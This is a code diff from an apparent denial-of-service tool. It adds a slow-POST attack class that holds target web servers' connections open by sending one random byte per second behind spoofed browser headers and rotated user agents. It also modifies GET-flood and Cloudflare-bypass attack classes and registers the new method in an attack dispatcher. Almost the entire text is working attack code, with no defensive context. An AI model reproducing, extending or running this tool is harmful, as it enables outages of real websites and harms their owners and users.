@@ -55,38 +55,131 @@ class NetroHTTP(object):
             
             path = "/" if not parsed_url.path else parsed_url.path
 
-            while time.time() < self.timeout and not self.kill:
-                path_request = f"{path}{f'?{parsed_url.query}' if parsed_url.query else ''}{f'#{parsed_url.fragment}' if parsed_url.fragment else ''}"
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                    "Accept-Encoding": "gzip, deflate, br, zstd",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Cache-Control": "max-age=0",
-                    "Connection": "Keep-Alive",
-                    "Dnt": "1",
-                    "Host": f"{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}",
-                    "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
-                    "Sec-Ch-Ua-Mobile": "?0",
-                    "Sec-Ch-Ua-Platform": '"Windows"',
-                    "Sec-Fetch-Dest": "document",
-                    "Sec-Fetch-Mode": "navigate",
-                    "Sec-Fetch-Site": "none",
-                    "Sec-Fetch-User": "?1",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": random.choice(self.useragents)
-                }
-                request_data = f"GET {path_request} HTTP/1.1\r\n"
+            #while time.time() < self.timeout and not self.kill:
+            path_request = f"{path}{f'?{parsed_url.query}' if parsed_url.query else ''}{f'#{parsed_url.fragment}' if parsed_url.fragment else ''}"
+            headers = {
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "Accept-Encoding": "gzip, deflate, br, zstd",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Cache-Control": "max-age=0",
+                "Connection": "Keep-Alive",
+                "Dnt": "1",
+                "Host": f"{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}",
+                "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+                "Sec-Ch-Ua-Mobile": "?0",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-User": "?1",
+                "Upgrade-Insecure-Requests": "1",
+                "User-Agent": random.choice(self.useragents)
+            }
+            request_data = f"GET {path_request} HTTP/1.1\r\n"
 
-                for header_name in headers:
-                    header_value = headers[header_name]
-                    request_data += f"{header_name}: {header_value}\r\n"
-                
-                request_data += "\r\n"
+            for header_name in headers:
+                header_value = headers[header_name]
+                request_data += f"{header_name}: {header_value}\r\n"
+            
+            request_data += "\r\n"
 
-                sock.send(request_data.encode())
-                time.sleep(1)
+            sock.send(request_data.encode())
+            time.sleep(1)
+
         except Exception:
             return
+        
+        finally:
+            self.active_threads -= 1
+
+class NetroHTTPPost(object):
+    kill = False
+    active_threads = 0
+
+    def __init__(self, url: str, timeout: float):
+        self.url = url
+        parsed_url = urlparse(url)
+
+        if not parsed_url.scheme in ["http", "https"]:
+            raise Exception("Invalid URL scheme.")
+        
+        if timeout < 10:
+            raise Exception("Invalid HTTP attack timeout value.")
+        
+        self.timeout = timeout
+        self.host_ip = socket.gethostbyname(parsed_url.hostname)
+
+        if not parsed_url.port:
+            if parsed_url.scheme == "https":
+                port = 443
+            else:
+                port = 80
+        else:
+            port = parsed_url.port
+        
+        self.port = port
+
+        with open("useragents.txt", "r") as file:
+            self.useragents = [x for x in file.read().splitlines() if x.strip()]
+            file.close()
+        
+    def create_attack_instance(self):
+        self.active_threads += 1
+
+        try:
+            parsed_url = urlparse(self.url)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((self.host_ip, self.port))
+
+            if parsed_url.scheme == "https":
+                ctx = ssl._create_unverified_context()
+                sock = ctx.wrap_socket(sock=sock, server_hostname=parsed_url.hostname)
+            
+            path = "/" if not parsed_url.path else parsed_url.path
+            path_request = f"{path}{f'?{parsed_url.query}' if parsed_url.query else ''}{f'#{parsed_url.fragment}' if parsed_url.fragment else ''}"
+
+            content_length = random.randint(512, 1024)
+
+            headers = {
+                "Accept": "*/*",
+                "Accept-Encoding": "gzip, deflate, br, zstd",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Content-Length": content_length,
+                "Content-Type": "application/x-www-urlform-encoded",
+                "Dnt": "1",
+                "Origin": f"{parsed_url.scheme}://{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}/",
+                "Host": f"{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}",
+                "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+                "Sec-Ch-Ua-Mobile": "?0",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-User": "?1",
+                "Upgrade-Insecure-Requests": "1",
+                "User-Agent": random.choice(self.useragents)
+            }
+            request_data = f"GET {path_request} HTTP/1.1\r\n"
+
+            for header_name in headers:
+                header_value = headers[header_name]
+                request_data += f"{header_name}: {header_value}\r\n"
+            
+            request_data += "\r\n"
+
+            sock.send(request_data.encode())
+            
+            for i in range(content_length):
+                if any([self.kill, time.time() >= self.timeout]):
+                    break
+                
+                sock.send(random._urandom(1))
+                time.sleep(1)
+
+        except Exception:
+            return
+        
         finally:
             self.active_threads -= 1
 
@@ -100,10 +193,14 @@ class NetroHCF(object):
         self.scraper = cloudscraper.create_scraper()
     
     def create_attack_instance(self):
+        self.active_threads += 1
+
         try:
             self.scraper.get(self.target)
+            time.sleep(1)
         except Exception:
             return
+        
         finally:
             self.active_threads -= 1
 
@@ -186,6 +283,8 @@ class NetroAttackManager(object):
         match method:
             case "http":
                 netro_attack = NetroHTTP(url=target, timeout=timeout)
+            case "http-post":
+                netro_attack = NetroHTTPPost(url=target, timeout=timeout)
             case "hcf":
                 netro_attack = NetroHCF(target=target)
             case "tcp":
